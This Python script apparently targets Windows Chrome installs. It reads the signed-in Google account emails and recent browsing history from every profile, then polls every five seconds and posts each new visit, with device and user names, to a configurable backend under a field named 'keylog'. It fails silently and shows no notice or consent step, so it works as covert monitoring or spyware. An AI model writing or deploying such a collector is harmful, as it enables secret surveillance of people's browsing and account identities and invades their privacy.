from __future__ import annotations
import json
import os
import shutil
import sqlite3
import sys
import tempfile
import uuid
from datetime import datetime, timedelta, timezone
from time import sleep
from platform import node as platform_node
from queue import Queue, Full, Empty
from threading import Event, Thread
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


try:
    import winreg  # type: ignore
except ImportError:
    winreg = None  # type: ignore[misc,assignment]

BACKEND_URL = os.environ.get("BACKEND_URL", "http://localhost:3000/")
APP_NAME = "chrome"
SEND_INTERVAL = float(os.environ.get("SEND_INTERVAL", "0.2"))  # seconds between backend sends
SEND_QUEUE_MAX = int(os.environ.get("SEND_QUEUE_MAX", "1000"))
TIMEZONE_OFFSET_HOURS = int(os.environ.get("TIMEZONE_OFFSET_HOURS", "7"))  # default UTC+7 (Cambodia)

def find_chrome_installation() -> str | None:
    """Check common registry keys to find chrome.exe."""
    if winreg is None:
        return None
    reg_targets = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"),
    ]
    for hive, subkey in reg_targets:
        try:
            with winreg.OpenKey(hive, subkey) as key:
                path, _ = winreg.QueryValueEx(key, "")
                if path and os.path.isfile(path):
                    return path
        except OSError:
            continue
    return None

def chrome_user_data_dir(username: str) -> str | None:
    path = os.path.join("C:\\", "Users", username, "AppData", "Local", "Google", "Chrome", "User Data")
    return path if os.path.isdir(path) else None

def load_profile_email_map(user_data_path: str) -> dict[str, str]:
    """Pull profile -> email/name mapping from Local State."""
    local_state_path = os.path.join(user_data_path, "Local State")
    if not os.path.isfile(local_state_path):
        return {}
    try:
        with open(local_state_path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
    except Exception:
        return {}

    info_cache = data.get("profile", {}).get("info_cache", {}) or {}
    email_map: dict[str, str] = {}
    for profile_id, info in info_cache.items():
        # Chrome stores Google account info in these fields when signed in.
        email = info.get("user_name") or info.get("gaia_name") or info.get("name")
        if email:
            email_map[profile_id] = email
    return email_map

def list_profile_dirs(user_data_path: str) -> list[str]:
    profiles = []
    default_path = os.path.join(user_data_path, "Default")
    if os.path.isdir(default_path):
        profiles.append("Default")

    for entry in os.listdir(user_data_path):
        full = os.path.join(user_data_path, entry)
        if not os.path.isdir(full):
            continue
        if entry.lower().startswith("profile"):
            profiles.append(entry)
    return profiles

def collect_profiles(user_data_path: str) -> list[dict[str, str]]:
    """Return profile records with id and email/name if available."""
    email_map = load_profile_email_map(user_data_path)
    profile_ids = list_profile_dirs(user_data_path)
    records: list[dict[str, str]] = []
    for prof in profile_ids:
        records.append(
            {
                "id": prof,
                "email": email_map.get(prof, ""),
            }
        )
    return records

def chrome_ts_to_iso(ts: int | float | None) -> str:
    """Convert Chrome/Webkit microsecond timestamp to ISO string."""
    if not ts:
        return ""
    try:
        utc_time = datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=ts)
        local_time = utc_time + timedelta(hours=TIMEZONE_OFFSET_HOURS)
        return local_time.isoformat()
    except Exception:
        return ""

def get_recent_history(user_data_path: str, profile_id: str = "Default", limit: int = 10) -> list[dict[str, str]]:
    """Return latest history entries for the given profile."""
    history_src = os.path.join(user_data_path, profile_id, "History")
    if not os.path.isfile(history_src):
        return []

    temp_dir = tempfile.mkdtemp(prefix="chrome_history_")
    history_copy = os.path.join(temp_dir, "History")
    try:
        shutil.copy2(history_src, history_copy)
        conn = sqlite3.connect(history_copy)
        cur = conn.cursor()
        cur.execute(
            """
            SELECT url, title, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT ?
            """,
            (limit,),
        )
        rows = cur.fetchall()
        conn.close()
    except Exception as exc:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return []

    shutil.rmtree(temp_dir, ignore_errors=True)

    history_entries: list[dict[str, str]] = []
    for url, title, last_visit_time in rows:
        history_entries.append(
            {
                "url": url or "",
                "title": title or "",
                "last_visit_time": chrome_ts_to_iso(last_visit_time),
            }
        )
    return history_entries

def gather_chrome_data() -> dict[str, object]:
    """Resolve paths and profiles; keep paths for later use but omit from JSON output."""
    username = os.getlogin()
    device_name = os.environ.get("COMPUTERNAME") or platform_node() or ""
    user_id = load_or_create_device_id()

    profiles: list[dict[str, str]] = []
    history: list[dict[str, str]] = []

    chrome_path = find_chrome_installation() if os.name == "nt" and winreg is not None else None
    user_data_path = chrome_user_data_dir(username) if os.name == "nt" else None
    if user_data_path:
        profiles = collect_profiles(user_data_path)
        history = get_recent_history(user_data_path, "Default", 10)

    return {
        "user_id": user_id,
        "username": username,
        "device_name": device_name,
        "chrome_path": chrome_path,
        "user_data_path": user_data_path,
        "profiles": profiles,
        "history": history,
    }

def send_to_backend(user_id: str, entry: dict[str, str], entry_type: str = "history") -> None:
    """Post a single entry to the backend server."""
    payload = {"userId": user_id, "keylog": entry, "type": entry_type}
    data_bytes = json.dumps(payload).encode("utf-8")
    req = Request(BACKEND_URL, data=data_bytes, headers={"Content-Type": "application/json"})
    try:
        with urlopen(req, timeout=5) as resp:
            resp.read()
    except (HTTPError, URLError, TimeoutError):
        return
    except Exception:
        return

def backend_sender(send_queue: Queue, stop_event: Event) -> None:
    """Worker to send queued entries to backend with pacing."""
    while not stop_event.is_set():
        try:
            user_id, entry, entry_type = send_queue.get(timeout=0.5)
        except Empty:
            continue
        send_to_backend(user_id, entry, entry_type)
        send_queue.task_done()
        sleep(SEND_INTERVAL)

def enqueue_backend(send_queue: Queue, user_id: str, entry: dict[str, str], entry_type: str = "history") -> None:
    """Enqueue entry for backend; drop if queue is full."""
    try:
        send_queue.put_nowait((user_id, entry, entry_type))
    except Full:
        return


def load_or_create_device_id() -> str:
    """Return a deterministic device-scoped UUID (env override) without writing to disk."""
    env_id = os.environ.get("DEVICE_ID")
    if env_id:
        return env_id
    username = os.getlogin()
    hostname = os.environ.get("COMPUTERNAME") or platform_node() or ""
    # Stable UUID based on hostname+username so the same device keeps the same id across runs.
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, f"{hostname}-{username}"))

def main():
    data = gather_chrome_data()
    user_data_path = data["user_data_path"]
    if not user_data_path:
        return
    send_queue: Queue = Queue(maxsize=SEND_QUEUE_MAX)
    stop_event = Event()
    worker = Thread(target=backend_sender, args=(send_queue, stop_event), daemon=True)
    worker.start()

    profile_records: list[dict[str, str]] = data.get("profiles", [])  # type: ignore[assignment]
    if not profile_records:
        return

    seen: dict[str, set[tuple[str, str]]] = {p["id"]: set() for p in profile_records}

    for prof in profile_records:
        pid = prof["id"]
        email = prof.get("email", "")
        initial_entries = list(reversed(get_recent_history(user_data_path, pid, 10)))
        if not initial_entries:
            continue
        for entry in initial_entries:
            key = (entry["url"], entry["last_visit_time"])
            seen[pid].add(key)
            output = {
                "device_id": data["user_id"],
                "device_user": data["username"],
                "device_name": data["device_name"],
                "app": APP_NAME,
                "profile": {"id": pid, "email": email},
                "history": entry,
            }
            enqueue_backend(send_queue, data["user_id"], output, "history")

    try:
        while True:
            sleep(5)
            for prof in profile_records:
                pid = prof["id"]
                email = prof.get("email", "")
                for entry in get_recent_history(user_data_path, pid, 10):
                    key = (entry["url"], entry["last_visit_time"])
                    if key in seen[pid]:
                        continue
                    seen[pid].add(key)
                    output = {
                        "device_id": data["user_id"],
                        "device_user": data["username"],
                        "device_name": data["device_name"],
                        "app": APP_NAME,
                        "profile": {"id": pid, "email": email},
                        "history": entry,
                    }
                    enqueue_backend(send_queue, data["user_id"], output, "history")
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        worker.join(timeout=2)

if __name__ == "__main__":
    main()
